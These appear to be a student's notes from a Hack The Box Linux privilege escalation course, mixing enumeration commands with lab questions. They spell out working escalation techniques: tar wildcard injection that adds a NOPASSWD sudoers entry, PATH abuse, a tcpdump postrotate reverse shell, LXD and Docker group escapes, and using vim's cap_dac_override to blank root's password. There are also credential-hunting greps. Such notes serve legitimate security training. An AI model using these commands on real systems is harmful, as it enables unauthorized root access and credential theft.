linux enum
ps aux | grep root
ps au 
ls -l ~/.ssh
History
sudo -l 
ls -la /etc/cron.daily/
file system & additional drives
$lsblk
find writeable folder
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
------------------
cat /etc/os-release
echo $PATH
env 
uname -a 
$lscpu 
cat /etc/shells
cat /etc/fstab  find any printer
route or netstat -rn    check for rounte table
/etc/resolv.conf     if host configured using internal dns
arp -a check arp table
....
 Enumerate the Linux environment and look for interesting files that might contain sensitive data. Submit the flag as the answer.
 $ find / -name *.sh 2>/dev/null | xargs cat | grep "HTB"
-------------
 ip a
cat /etc/hosts
lastlog
w
Finding History Files
$ find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
Cron
$ ls -la /etc/cron.daily/
Proc
$ find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"
Installed Packages
  $ apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list

$ sudo -V
Binaries
$ ls -l /bin /usr/bin/ /usr/sbin/
https://gtfobins.github.io/
$ for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done
Trace System Calls
$ strace ping -c1 10.129.112.20
Configuration Files
$ find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
Scripts
$ find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
Running Services by User
$ ps aux | grep root
 What is the latest Python version that is installed on the target?
-------------------------------------
Credential Hunting
$ grep 'DB_USER\|DB_PASSWORD' wp-config.php
The spool or mail directories
$  find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
SSH Keys
$  ls ~/.ssh
+ 1  Find the WordPress database password.
cat /var/www/html/wp-config.php | grep "DB_PASSWORD"
----------
Path Abuse
$ echo $PATH
$ pwd && conncheck   Creating a script or program in a directory specified in the PATH will make it executable from any directory on the system.
Adding . to a user's PATH adds their current working directory to the list.
 ls with a malicious script such as a reverse shell. If we add . to the path by issuing the command PATH=.:$PATH and then export PATH
 $ echo $PATH 
 $ PATH=.:${PATH}
 $ export PATH
 $ echo $PATH
we modify the path to run a simple echo command when the command ls is typed.
$ touch ls
$ echo 'echo "PATH ABUSE!!"' > ls
$ chmod +x ls
--------------
Wildcard Abuse
 abused for privilege escalation is the tar command, a common program for creating/extracting archives. If we look at the man page for the tar command, we see the following:
 $man tar
 $ echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
 $ echo "" > "--checkpoint-action=exec=sh root.sh"
 $ echo "" > --checkpoint=1
 ~$ ls -la
 Once the cron job runs again, we can check for the newly added sudo privileges and sudo to root directly.
 $ sudo -l
 ------------
 Escaping Restricted Shells
 RBASH
 RKSH
  RZSH
Escaping Command injection
For example, we could use the following command to inject a pwd command into the argument of the ls command:
$ls -l 'pwd'
Command Substitution
 imagine the shell allows users to execute commands by enclosing them in backticks (`). In that case
Command chaining
  separated by a shell metacharacter, such as a semicolon (;) or a vertical bar (|), to execute a command.
Environment Variables
Shell Functions
bypass: https://vk9-sec.com/linux-restricted-shell-bypass/

"Use different approaches to escape the restricted shell and read the flag.txt file. Submit the contents as the answer."
----------------------
Special permissions
The Set User ID upon Execution (setuid) permission can allow a user to execute a program or script with the permissions of another user, typically with elevated privileges. The setuid bit appears as an s.
$find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null 
find / -uid 0 -perm -6000 -type f 2>/dev/null
These files can be leveraged in the same manner as setuid binaries to escalate privileges.
$ find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits
https://gtfobins.github.io/
$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
#id
"Find a file with the setuid bit set that was not shown in the section command output (full path to the binary)."
$ ssh htb-student@10.129.119.156
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
"Find a file with the setgid bit set that was not shown in the section command output (full path to the binary)."
$ find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
----------------------
Sudo Right Abuse
sudo -l 
/etc/sudoers
 the user's password to list their sudo rights, but any rights entries with the NOPASSWD option can be seen without entering a password.
For example, if the sudoers file is edited to grant a user the right to run a command such as tcpdump per the following entry in the sudoers file: (ALL) NOPASSWD: /usr/sbin/tcpdump an attacker could leverage this to take advantage of a the postrotate-command option.
$man tcpdump
By specifying the -z flag, an attacker could use tcpdump to execute a shell script, gain a reverse shell as the root user or run other privileged commands. For example, an attacker could create the shell script .test containing a reverse shell and execute it as follows:
$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
$ cat /tmp/.test
$ sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
Next, start a netcat listener on our attacking box and run tcpdump as root with the postrotate-command. If all goes to plan, we will receive a root reverse shell connection.
$ nc -lnvp 443
# id && hostname  
https://wiki.ubuntu.com/AppArmor

	Always specify the absolute path to any binaries listed in the sudoers file entry. Otherwise, an attacker may be able to leverage PATH abuse (which we will see in the next section) to create a malicious binary that will be executed when the command runs (i.e., if the sudoers entry specifies cat instead of /bin/cat this could likely be abused).
2.	Grant sudo rights sparingly and based on the principle of least privilege. Does the user need full sudo rights? Can they still perform their job with one or two entries in the sudoers file? Limiting the privileged command that a user can run will greatly reduce the likelihood of successful privilege escalation.
--------------------------
Privileged Groups
LXC / LXD LXD is similar to Docker and is Ubuntu's container manager.
all users are added to the LXD group. Membership of this group can be used to escalate privileges by creating an LXD container, making it privileged, and then accessing the host file system at /mnt/root. Let's confirm group membership and use these rights to escalate to root.
$id
$unzip alpine.zip
https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04
Start the LXD initialization process. Choose the defaults for each prompt. Consult this post for more information on each step.
$lxd init 
Import the local image.
$lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine 
Start a privileged container with the security.privileged set to true to run the container without a UID mapping, making the root user in the container the same as the root user on the hos
$lxc init alpine r00t -c security.privileged=true
Mount the host file system.
$ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
Finally, spawn a shell inside the container instance. We can now browse the mounted host file system as root. For example, to access the contents of the root directory on the host type cd /mnt/root/root. From here we can read sensitive files such as /etc/shadow and obtain password hashes or gain access to SSH keys in order to connect to the host system as root, and more.
$lxc start r00t 
$lxc exec r00t /bin/sh 
$id > #
Docker 
Placing a user in the docker group is essentially equivalent to root level access to the file system without requiring a password
$docker run -v /root:/mnt -it ubuntu
This command creates a new Docker instance with the /root directory on the host file system mounted as a volume. Once the container is started we are able to browse the mounted directory and retrieve or add SSH keys for the root user. This could be done for other directories such as /etc which could be used to retrieve the contents of the /etc/shadow file for offline password cracking or adding a privileged user.
Disk 
Users within the disk group have full access to any devices contained within /dev, such as /dev/sda1, which is typically the main device used by the operating system. An attacker with these privileges can use debugfs to access the entire file system with root level privileges. As with the Docker group example, this could be leveraged to retrieve SSH keys, credentials or to add a user.
admin
Members of the adm group are able to read all logs stored in /var/log. This does not directly grant root access, but could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs.
$id 
"Use the privileged group rights of the secaudit user to locate a flag."
$id
$ grep -rw "flag" /var/log 2>/dev/null
--------------------------
Capabilities
Linux capabilities are a security feature in the Linux operating system that allows specific privileges to be granted to processes, allowing them to perform specific actions that would otherwise be restricted.
for example, we can use the setcap command to set capabilities for specific executables. This command allows us to specify the capability we want to set and the value we want to assign.

For example, we could use the following command to set the cap_net_bind_service capability for an executable:
Set capability
sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
Enumerating Capabilities
$find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
This one-liner uses the find command to search for all binary executables in the directories where they are typically located and then uses the -exec flag to run the getcap command on each, showing the capabilities that have been set for that binary. The output of this command will show a list of all binary executables on the system, along with the capabilities that have been set for each.
exploitation
$ getcap /usr/bin/vim.basic
$ cat /etc/passwd | head -n1
$ /usr/bin/vim.basic /etc/passwd
We also can make these changes in a non-interactive mode:
$ echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
$ cat /etc/passwd | head -n1
Escalate the privileges using capabilities and read the flag.txt file in the "/root" directory. Submit its contents as the answer.
$find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
Utilizing the cap_dac_override capability on the vim.basic binary (which allows for override of access controls), students need to use the binary to view the /etc/passwd file, deleting the x on the line for the root user:
su root 
$cat /root/flag.txt